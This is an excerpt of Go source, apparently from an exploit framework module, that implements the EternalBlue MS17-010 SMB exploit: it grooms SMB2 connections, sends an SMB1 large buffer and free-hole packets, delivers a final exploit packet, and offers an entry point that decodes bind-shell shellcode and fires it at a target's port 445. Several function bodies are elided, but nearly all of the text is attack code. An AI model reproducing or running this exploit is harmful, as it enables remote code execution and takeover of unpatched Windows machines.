...
func (self *Exp_MS17010) eternalBlue(address string, initialGrooms, maxAttempts int, sc []byte) error {
	...
	for i := 0; i < maxAttempts; i++ {
		self.EchoSuccessMsg(fmt.Sprintf("try %v...", i))
...
func (self *Exp_MS17010) exploit(address string, grooms int, payload []byte) error {
	// connect host
	self.EchoSuccessMsg("connect host")
	...
	self.EchoSuccessMsg("send SMB1 large buffer")
	...
	self.EchoSuccessMsg("initialize groom threads")
	...
	// groom socket
	self.EchoSuccessMsg("smb2Grooms socket")

	groomConns, err := smb2Grooms(address, grooms)
	if err != nil {
		return err
	}
	self.EchoSuccessMsg("smb1FreeHole socket")
	...
	self.EchoSuccessMsg("Running final exploit packet")
	...
	self.EchoSuccessMsg(fmt.Sprintf("NT Status: 0x%08X\n", ntStatus))

	//fmt.Println("send the payload with the grooms")
	self.EchoSuccessMsg("send the payload with the grooms")
...
func (self *Exp_MS17010) Attack_cmd1() (expResult exp_model.ExpResult) {
	cmd := self.MustGetStringParam("cmd")
	address := self.Params.BaseParam.Target + ":445"
	var sc string
	switch self.MustGetStringParam("payload") {
	case "bind":
	...
	if err != nil {
		self.EchoErrMsg(self.Params.BaseParam.Target + " MS17-010 shellcode decode error " + err.Error())
		return
	}
	err = self.eternalBlue(address, 12, 12, sc1)
	if err != nil {
		self.EchoErrMsg(self.Params.BaseParam.Target + " MS17-010 exp failed " + err.Error())
		return
	}
	self.EchoSuccessMsg(self.Params.BaseParam.Target + "\tMS17-010\texploit end")
	return
}

func init() {
	exp_register.ExpStructRegister(&Exp_MS17010{}, "exp_MS17010.yml")
